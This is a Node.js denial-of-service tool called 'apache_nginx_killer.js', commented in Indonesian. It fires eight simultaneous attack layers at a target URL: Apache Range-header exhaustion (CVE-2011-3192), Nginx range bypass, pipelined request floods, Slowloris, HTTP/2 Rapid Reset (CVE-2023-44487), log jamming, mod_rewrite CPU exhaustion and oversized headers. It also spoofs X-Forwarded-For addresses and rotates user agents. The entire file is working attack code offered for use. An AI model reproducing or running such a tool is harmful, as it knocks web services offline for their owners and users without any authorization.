#!/usr/bin/env node
'use strict';

const http = require('http');
const https = require('https');
const net = require('net');
const tls = require('tls');
const { spawn } = require('child_process');

const [,, target, duration, threads] = process.argv;

if (!target || !duration) {
  console.error('Usage: node apache_nginx_killer.js <target> <duration> [threads]');
  console.error('Example: node apache_nginx_killer.js https://target.com 60 500');
  process.exit(1);
}

const dur = parseInt(duration) || 60;
const thr = parseInt(threads) || 500;
const start = Date.now();
const endTime = start + dur * 1000;

console.log(`[APACHE-NGINX KILLER] Target: ${target}, Durasi: ${dur}s, Threads: ${thr}`);
console.log('[KILLER] Loading 8-layer Apache/Nginx exploit...');

let totalPackets = 0;
let totalBytes = 0;

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Version/18.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/131.0.6778.200 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.6723.69 Safari/537.36 Edg/130.0.2849.80',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/130.0.6723.69 Safari/537.36 Edg/130.0.2849.80',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Version/17.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 Chrome/131.0.6778.200 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.6668.100 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; CrOS x86_64 15662.74.0) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.6613.137 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/130.0.6723.102 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 Version/16.7 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:130.0) Gecko/20100101 Firefox/130.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/127.0.6533.119 Safari/537.36 OPR/113.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.6533.119 Safari/537.36 OPR/113.0.0.0',
  'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 Chrome/130.0.6723.102 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 Version/15.7 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.6478.182 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.6723.69 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:129.0) Gecko/20100101 Firefox/129.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/130.0.6723.102 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.6422.141 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.6367.201 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.6367.201 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 Chrome/131.0.6778.200 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:128.0) Gecko/20100101 Firefox/128.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.6312.122 Safari/537.36 Edg/123.0.2420.65',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.6312.122 Safari/537.36 Edg/123.0.2420.65',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 Version/14.8 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.6261.129 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.6261.129 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 Chrome/131.0.6778.200 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:127.0) Gecko/20100101 Firefox/127.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
];

const getUA = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
const getRandIP = () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;

// ─── LAYER 1: APACHE KILLER (CVE-2011-3192) ────────────────
// Range header dengan banyak bytes - makan memory Apache
function apacheKiller() {
  const lib = target.startsWith('https') ? https : http;
  const parsed = new URL(target);
  
  function send() {
    if (Date.now() > endTime) return;
    
    // 1000+ range requests - Apache makan memory sampe crash
    let ranges = [];
    for (let i = 0; i < 1000; i++) {
      const start = Math.floor(Math.random() * 10000000);
      const end = start + Math.floor(Math.random() * 1000);
      ranges.push(`${start}-${end}`);
    }
    
    const req = lib.get({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname || '/',
      headers: {
        'User-Agent': getUA(),
        'Range': `bytes=${ranges.join(',')}`,
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'X-Forwarded-For': getRandIP()
      }
    }, res => {
      totalPackets++;
      totalBytes += res.headers['content-length'] || 0;
      res.resume();
    });
    req.on('error', () => {});
    req.setTimeout(500, () => req.destroy());
    setImmediate(send);
  }
  for (let i = 0; i < Math.min(thr/2, 100); i++) send();
}

// ─── LAYER 2: NGINX RANGE FILTER BYPASS ──────────────────────
// Nginx cache bypass dengan Range + If-Range
function nginxRangeBypass() {
  const lib = target.startsWith('https') ? https : http;
  const parsed = new URL(target);
  
  function send() {
    if (Date.now() > endTime) return;
    
    const req = lib.get({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname || '/',
      headers: {
        'User-Agent': getUA(),
        'Range': 'bytes=0-0, 1-1, 2-2, 3-3, 4-4, 5-5, 6-6, 7-7, 8-8, 9-9, 10-10, 11-11, 12-12, 13-13, 14-14, 15-15, 16-16, 17-17, 18-18, 19-19',
        'If-Range': new Date().toUTCString(),
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache'
      }
    }, res => {
      totalPackets++;
      totalBytes += res.headers['content-length'] || 0;
      res.resume();
    });
    req.on('error', () => {});
    req.setTimeout(500, () => req.destroy());
    setImmediate(send);
  }
  for (let i = 0; i < Math.min(thr/3, 50); i++) send();
}

// ─── LAYER 3: HTTP/1.1 PIPELINE FLOOD ────────────────────────
// Kirim banyak request dalam 1 koneksi TCP
function httpPipeline() {
  const parsed = new URL(target);
  const isHttps = parsed.protocol === 'https:';
  const host = parsed.hostname;
  const port = parsed.port || (isHttps ? 443 : 80);
  
  function send() {
    if (Date.now() > endTime) return;
    
    const sock = isHttps ? 
      tls.connect({ host, port, servername: host, rejectUnauthorized: false }) :
      net.createConnection(port, host);
    
    let pipeline = '';
    for (let i = 0; i < 50; i++) {
      pipeline += 
        `GET ${parsed.pathname || '/'}?${Math.random()} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: ${getUA()}\r\n` +
        `Accept: */*\r\n` +
        `Connection: keep-alive\r\n` +
        `X-Forwarded-For: ${getRandIP()}\r\n` +
        `\r\n`;
    }
    
    sock.on('connect', () => {
      sock.write(pipeline);
      totalPackets += 50;
      totalBytes += pipeline.length;
      setTimeout(() => sock.destroy(), 100);
    });
    sock.on('error', () => {});
    sock.setTimeout(200, () => sock.destroy());
    setImmediate(send);
  }
  for (let i = 0; i < Math.min(thr/4, 30); i++) send();
}

// ─── LAYER 4: SLOWLORIS (Apache & Nginx) ─────────────────────
// Bikin connection hanging - makan thread server
function slowloris() {
  const parsed = new URL(target);
  const host = parsed.hostname;
  const port = parsed.port || 80;
  
  function send() {
    if (Date.now() > endTime) return;
    
    const sock = net.createConnection(port, host);
    sock.on('connect', () => {
      sock.write(
        `GET ${parsed.pathname || '/'}?${Math.random()} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: ${getUA()}\r\n`
      );
      
      // Keep sending headers slowly - makan thread server
      const interval = setInterval(() => {
        if (Date.now() > endTime || sock.destroyed) {
          clearInterval(interval);
          return;
        }
        sock.write(`X-Header-${Math.random().toString(36).substring(2, 8)}: ${'a'.repeat(1024)}\r\n`);
        totalPackets++;
        totalBytes += 1024;
      }, 100);
      
      setTimeout(() => {
        clearInterval(interval);
        sock.destroy();
      }, 10000);
    });
    sock.on('error', () => {});
    sock.setTimeout(11000, () => sock.destroy());
    setImmediate(send);
  }
  for (let i = 0; i < Math.min(thr/2, 100); i++) send();
}

// ─── LAYER 5: HTTP/2 RAPID RESET (CVE-2023-44487) ──────────
// Nginx HTTP/2 vulnerability
function http2RapidReset() {
  const parsed = new URL(target);
  const host = parsed.hostname;
  
  function buildH2Frame(type, flags, streamId, payload) {
    const len = Buffer.allocUnsafe(3);
    len.writeUIntBE(payload.length, 0, 3);
    const hdr = Buffer.from([len[0], len[1], len[2], type, flags]);
    const sid = Buffer.allocUnsafe(4);
    sid.writeUInt32BE(streamId >>> 0);
    return Buffer.concat([hdr, sid, payload]);
  }
  
  function send() {
    if (Date.now() > endTime) return;
    
    try {
      const sock = net.createConnection(443, host);
      const tlsSock = tls.connect({
        socket: sock,
        servername: host,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2']
      });
      
      tlsSock.on('secureConnect', () => {
        tlsSock.write(Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'));
        tlsSock.write(buildH2Frame(0x04, 0x00, 0, Buffer.alloc(0)));
        
        // Rapid reset - create stream then immediately reset
        for (let i = 0; i < 1000; i++) {
          const sid = (i * 2 + 1) >>> 0;
          const headers = Buffer.from(
            `:method\tGET\n:path\t/?${Math.random()}\n:authority\t${host}\nuser-agent\t${getUA()}\n`
          );
          tlsSock.write(buildH2Frame(0x01, 0x00, sid, headers));
          // Immediately send RST_STREAM
          const rst = Buffer.allocUnsafe(4);
          rst.writeUInt32BE(0x08);
          tlsSock.write(buildH2Frame(0x03, 0x00, sid, rst));
          totalPackets += 2;
          totalBytes += headers.length + rst.length;
        }
        tlsSock.destroy();
      });
    } catch(e) {}
    setImmediate(send);
  }
  for (let i = 0; i < 10; i++) send();
}

// ─── LAYER 6: APACHE LOG JAMMER ──────────────────────────────
// Request dengan path panjang dan karakter aneh - bikin log full
function logJammer() {
  const lib = target.startsWith('https') ? https : http;
  const parsed = new URL(target);
  
  function send() {
    if (Date.now() > endTime) return;
    
    const longPath = '/' + 'a'.repeat(8000) + '/' + Math.random().toString(36).substring(2, 10);
    
    const req = lib.get({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: longPath,
      headers: {
        'User-Agent': getUA(),
        'Referer': 'https://' + 'x'.repeat(5000) + '.com',
        'Cookie': `session=${'a'.repeat(5000)}`
      }
    }, res => {
      totalPackets++;
      totalBytes += res.headers['content-length'] || 0;
      res.resume();
    });
    req.on('error', () => {});
    req.setTimeout(500, () => req.destroy());
    setImmediate(send);
  }
  for (let i = 0; i < Math.min(thr/3, 50); i++) send();
}

// ─── LAYER 7: APACHE MOD_REWRITE KILLER ──────────────────────
// Request dengan pola rewrite yang kompleks - makan CPU
function modRewriteKiller() {
  const lib = target.startsWith('https') ? https : http;
  const parsed = new URL(target);
  
  function send() {
    if (Date.now() > endTime) return;
    
    const paths = [
      `/index.php?${'a'.repeat(100)}=${'b'.repeat(100)}&${'c'.repeat(100)}=${'d'.repeat(100)}&${'e'.repeat(100)}=${'f'.repeat(100)}`,
      `/wp-admin/admin-ajax.php?action=${'a'.repeat(200)}&${'b'.repeat(200)}`,
      `/api/v1/${'a'.repeat(500)}/${'b'.repeat(500)}`,
    ];
    
    const req = lib.get({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: paths[Math.floor(Math.random() * paths.length)],
      headers: {
        'User-Agent': getUA(),
        'X-Forwarded-For': getRandIP(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      }
    }, res => {
      totalPackets++;
      totalBytes += res.headers['content-length'] || 0;
      res.resume();
    });
    req.on('error', () => {});
    req.setTimeout(500, () => req.destroy());
    setImmediate(send);
  }
  for (let i = 0; i < Math.min(thr/3, 50); i++) send();
}

// ─── LAYER 8: NGINX PROXY BUFFER OVERFLOW ────────────────────
// Kirim header besar - overflow proxy buffer
function proxyBufferOverflow() {
  const lib = target.startsWith('https') ? https : http;
  const parsed = new URL(target);
  
  function send() {
    if (Date.now() > endTime) return;
    
    const bigHeader = 'X-Large-Header: ' + 'a'.repeat(20000);
    
    const req = lib.get({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname || '/',
      headers: {
        'User-Agent': getUA(),
        'X-Forwarded-For': getRandIP(),
        'X-Real-IP': getRandIP(),
        'X-Custom-Header': 'a'.repeat(10000),
        'X-Frame-Options': 'DENY',
        'X-Content-Type-Options': 'nosniff',
      }
    }, res => {
      totalPackets++;
      totalBytes += res.headers['content-length'] || 0;
      res.resume();
    });
    req.on('error', () => {});
    req.setTimeout(500, () => req.destroy());
    setImmediate(send);
  }
  for (let i = 0; i < Math.min(thr/3, 50); i++) send();
}

// ─── LAUNCH ALL 8 LAYERS ──────────────────────────────────────
console.log('[APACHE-NGINX KILLER] Firing all 8 layers...');

apacheKiller();
nginxRangeBypass();
httpPipeline();
slowloris();
http2RapidReset();
logJammer();
modRewriteKiller();
proxyBufferOverflow();

// ─── STATS ──────────────────────────────────────────────────
setInterval(() => {
  const elapsed = Math.floor((Date.now() - start) / 1000);
  const rps = elapsed > 0 ? Math.floor(totalPackets / elapsed) : 0;
  if (elapsed >= dur) {
    console.log(`\n[APACHE-NGINX KILLER DONE] Packets: ${totalPackets.toLocaleString()} | RPS: ${rps} | Bytes: ${(totalBytes/1024/1024).toFixed(2)}MB`);
    process.exit(0);
  }
  process.stdout.write(`\r[KILLER] ${elapsed}s/${dur}s | Packets: ${totalPackets.toLocaleString()} | RPS: ${rps} | Bytes: ${(totalBytes/1024/1024).toFixed(1)}MB`);
}, 1000);